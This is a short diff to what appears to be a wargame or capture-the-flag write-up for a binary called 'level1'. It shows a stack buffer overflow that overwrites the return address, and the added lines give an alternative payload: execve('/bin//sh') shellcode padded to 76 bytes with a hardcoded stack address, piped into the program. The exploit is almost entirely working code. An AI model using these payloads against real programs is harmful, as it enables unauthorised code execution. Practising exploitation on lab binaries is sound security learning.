@@ -54,3 +54,9 @@ return address of `run` is `0x08048444` which is `0x44\x84\x04\x08` in little en
 ```bash
 (python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat)  | ./level1
 ```
+
+# Or shellcode
+
+```bash
+(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + "A" * (76-23) + "\xf0\xf6\xff\xbf"'; cat) | /home/user/level1/level1
+```
